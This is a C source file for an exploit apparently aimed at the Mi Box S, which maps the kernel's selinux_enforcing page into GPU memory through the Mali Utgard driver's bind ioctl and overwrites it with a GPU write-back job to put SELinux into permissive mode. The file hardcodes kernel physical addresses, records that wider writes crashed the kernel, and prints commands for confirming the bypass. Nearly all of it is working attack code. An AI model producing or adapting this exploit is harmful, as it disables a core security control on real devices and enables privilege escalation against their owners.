/*
 * seout.c - Mi Box S SELinux Permissive via Mali Utgard GPU DMA
 *
 * Strategy:
 * - BIND selinux_enforcing physical page to GPU
 * - Write RGBA=(0,0,0,0) at offset 0x4e8 (8-byte aligned) via PP job
 * - selinux_enforcing is at offset 0x4ec within the page
 * - 184 bytes of zero writes cover 0x4e8 ~ 0x5a0
 * - selinux_enforcing[0] = 0 → SELinux Permissive
 *
 * Note:
 * - 16x16 frame (1024 bytes) caused kernel panic (surrounding data destroyed)
 * - 1x1 frame (184 bytes) has smaller coverage, less likely to panic
 * - This is a "blast" write, not precise 4-byte write
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>

/* ==================== CONSTANTS ==================== */

#define KERNEL_PHYS_BASE        0x01080000u
#define SELINUX_ENFORCING_RVA   0x19B94ECu
#define SELINUX_ENFORCING_PHYS  (KERNEL_PHYS_BASE + SELINUX_ENFORCING_RVA)
#define SELINUX_ENFORCING_PAGE  (SELINUX_ENFORCING_PHYS & ~0xFFFu)
#define SELINUX_ENFORCING_INPAGE (SELINUX_ENFORCING_PHYS & 0xFFFu)
#define SELINUX_ENFORCING_ALIGN  (SELINUX_ENFORCING_INPAGE & ~0x7u)

/* GPU address layout */
#define GPU_VA_TGT  0x40000000u   /* BIND target page (physical) */
#define GPU_VA_DATA 0x40300000u   /* ALLOC_MEM job data */
#define DATA_SIZE   0x4000

/* ==================== MALI IOCTL ==================== */

#define MALI_IOC_MEM_ALLOC      0xC0288300u
#define MALI_IOC_MEM_BIND       0xC0288302u
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)
#define MALI_IOC_PP_START_JOB   0xC1988400u
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202u
#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize; uint32_t psize;
    uint32_t flags; uint64_t backend_handle; int32_t secure_shared_fd;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx; uint32_t vaddr; uint32_t size; uint32_t flags;
    uint32_t padding; uint32_t phys_addr; uint32_t rights;
    uint32_t bind_flags; uint32_t pad2;
} mali_uk_bind_mem_s;

#define MALI_UK_TIMELINE_MAX 3
typedef struct { uint32_t points[MALI_UK_TIMELINE_MAX]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12]; uint32_t wb2_registers[12];
    uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} mali_uk_pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} mali_uk_wait_for_notification_s;

/* Frame register indices */
#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR     1
#define FR_FLAGS           3
#define FR_CLEAR_COLOR_0   6
#define FR_CLEAR_COLOR_1   7
#define FR_CLEAR_COLOR_2   8
#define FR_CLEAR_COLOR_3   9
#define FR_WIDTH          10
#define FR_HEIGHT         11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13

/* Write-back register indices */
#define WB_TYPE         0
#define WB_ADDRESS      1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE   3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH        5
#define WB_TARGET_FLAGS 6
#define WB_MRT_ENABLE   7

/* ==================== GLOBAL STATE ==================== */

static int fd = -1;
static void *data_buf = NULL;
static volatile int g_to = 0;

static void alarm_handler(int s) { (void)s; g_to = 1; }

static int tio(unsigned int cmd, void *buf, int timeout) {
    alarm(timeout); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* ==================== WB WRITE PRIMITIVE ==================== */

/*
 * wb_write_rgba: Write RGBA (R,G,B,A) at given GPU VA target offset.
 * Uses 1x1 RGBA8888 frame, writes ~184 bytes of repeating pattern.
 * Returns 0 on success.
 */
static int wb_write_rgba(uint32_t tgt_offset, uint8_t vr, uint8_t vg, uint8_t vb, uint8_t va)
{
    uint8_t *buf = (uint8_t *)data_buf;
    memset(buf, 0, DATA_SIZE);

    /* Empty tile block */
    memset(buf + 0x200, 0, 64);

    /* Minimal fragment shader (mov r0, color) */
    static const uint32_t shader[] = {
        0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
    };
    memcpy(buf + 0x080, shader, sizeof(shader));

    /* FIXED PLB (no B0 instruction) */
    uint32_t *plb = (uint32_t *)buf;
    uint32_t tileblk_gpu = GPU_VA_DATA + 0x200;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | ((tileblk_gpu >> 3) & ~0xE0000003u);
    plb[3] = 0xBC000000;

    /* Render state words */
    uint32_t *rsw = (uint32_t *)(buf + 0x100);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + 0x080) | 5;
    rsw[0x0D] = 0x00000100;

    /* Clear color = ARGB (Mali format) */
    uint32_t clear_color = ((uint32_t)va << 24) | ((uint32_t)vr << 16) | ((uint32_t)vg << 8) | vb;

    /* WB target address */
    uint32_t wb_addr = GPU_VA_TGT + tgt_offset;

    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    /* Frame registers */
    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + 0x000;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + 0x100;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_COLOR_0]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_1]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_2]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_3]   = clear_color;
    job.frame_registers[FR_WIDTH]           = 1;
    job.frame_registers[FR_HEIGHT]          = 1;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + 0x1000;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0x400;

    /* Write-back 0 registers */
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;  /* RGBA8888 */
    job.wb0_registers[WB_DOWNSAMPLE]   = 0;
    job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
    job.wb0_registers[WB_PITCH]        = 1;
    job.wb0_registers[WB_TARGET_FLAGS] = 0;
    job.wb0_registers[WB_MRT_ENABLE]   = 0;

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    __builtin___clear_cache((char *)buf, (char *)buf + DATA_SIZE);

    int ret = tio(MALI_IOC_PP_START_JOB, &job, 5);
    if (ret == -999) { printf("[-] PP START TIMEOUT\n"); return -999; }
    if (ret != 0) { printf("[-] PP START err=%d\n", -ret); return ret; }

    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    ret = tio(MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    if (ret == -999) { printf("[-] WAIT TIMEOUT\n"); return -999; }
    if (ret != 0) { printf("[-] WAIT err=%d\n", -ret); return ret; }

    uint32_t status;
    memcpy(&status, notif.data + 8, 4);
    if (!(status & (1 << 16))) {
        printf("[-] PP FAILED (status=0x%08x)\n", status);
        return -1;
    }
    return 0;
}

/* ==================== MAIN ==================== */

int main(int argc, char **argv)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alarm_handler;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("██   ██  ██████  ██████  ████████\n");
    printf("██  ██  ██    ██ ██   ██    ██   \n");
    printf("█████   ██    ██ ██████     ██   \n");
    printf("██  ██  ██    ██ ██   ██    ██   \n");
    printf("██   ██  ██████  ██   ██    ██   \n");
    printf("\n         Mi Box S SELinux Out (Permissive)\n\n");

    printf("[*] KERNEL_PHYS_BASE=0x%08x (fixed, no KASLR leak needed)\n", KERNEL_PHYS_BASE);
    printf("[*] selinux_enforcing phys=0x%08x (page 0x%08x + 0x%x)\n",
           SELINUX_ENFORCING_PHYS, SELINUX_ENFORCING_PAGE, SELINUX_ENFORCING_INPAGE);
    printf("[*] 8-byte aligned write start: 0x%x (offset in page)\n", SELINUX_ENFORCING_ALIGN);
    printf("[*] write range: 0x%x ~ 0x%x (184 bytes)\n",
           SELINUX_ENFORCING_ALIGN, SELINUX_ENFORCING_ALIGN + 184);

    /* Open Mali device */
    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        perror("[-] open /dev/mali");
        return 1;
    }
    printf("[+] opened /dev/mali (fd=%d)\n", fd);

    /* ALLOC_MEM for job data */
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = DATA_SIZE;
    alloc.psize = DATA_SIZE;
    if (tio(MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) {
        printf("[-] ALLOC_MEM failed\n");
        return 1;
    }
    printf("[+] ALLOC_MEM OK (backend=0x%llx)\n", (unsigned long long)alloc.backend_handle);

    /* mmap job data */
    data_buf = mmap(NULL, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (data_buf == MAP_FAILED) {
        perror("[-] mmap job buf");
        return 1;
    }
    printf("[+] mmap job buf OK (%p)\n", data_buf);

    /* BIND selinux_enforcing physical page */
    printf("[1] BIND selinux_enforcing page 0x%08x -> GPU VA 0x%08x\n",
           SELINUX_ENFORCING_PAGE, GPU_VA_TGT);
    mali_uk_bind_mem_s bind;
    memset(&bind, 0, sizeof(bind));
    bind.vaddr = GPU_VA_TGT;
    bind.size = 0x1000;
    bind.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    bind.phys_addr = SELINUX_ENFORCING_PAGE;
    bind.rights = 0x37;
    bind.bind_flags = 0;
    int bind_rc = tio(MALI_IOC_MEM_BIND, &bind, 3);
    if (bind_rc == -999) {
        printf("[-] BIND TIMEOUT (HUNG!)\n");
        return 1;
    }
    if (bind_rc != 0) {
        printf("[-] BIND failed: %s (err=%d)\n", strerror(-bind_rc), -bind_rc);
        return 1;
    }
    printf("[+] BIND OK\n");

    /* Write zero at 8-byte aligned offset (0x4e8) */
    /*
     * selinux_enforcing is at 0x4ec.
     * 0x4e8 + 4 = 0x4ec → the 2nd byte of RGBA is at selinux_enforcing.
     * RGBA=(0,0,0,0) writes all zeros, so byte 0x4ec = 0.
     * This sets selinux_enforcing = 0 (Permissive mode).
     */
    printf("[2] write RGBA=(0,0,0,0) at offset 0x%x (8-byte aligned)\n",
           SELINUX_ENFORCING_ALIGN);
    printf("  [*] selinux_enforcing at 0x%08x + 0x%x, aligned write at 0x%x\n",
           SELINUX_ENFORCING_PAGE, SELINUX_ENFORCING_INPAGE, SELINUX_ENFORCING_ALIGN);
    printf("  [*] write covers 0x%x ~ 0x%x (184 bytes of zero)\n",
           SELINUX_ENFORCING_ALIGN, SELINUX_ENFORCING_ALIGN + 184);

    int rc = wb_write_rgba(SELINUX_ENFORCING_ALIGN, 0, 0, 0, 0);
    if (rc != 0) {
        printf("[-] WRITE FAILED\n");
        return 1;
    }
    printf("[+] WRITE OK - selinux_enforcing should now be 0 (Permissive)\n");
    printf("\n[*] Check SELinux status:\n");
    printf("  adb shell 'getenforce' → should show 'Permissive'\n");
    printf("  adb shell 'cat /sys/class/thermal/thermal_zone0/type' → should work (was denied)\n");

    /* Cleanup */
    munmap(data_buf, DATA_SIZE);
    close(fd);

    return 0;
}
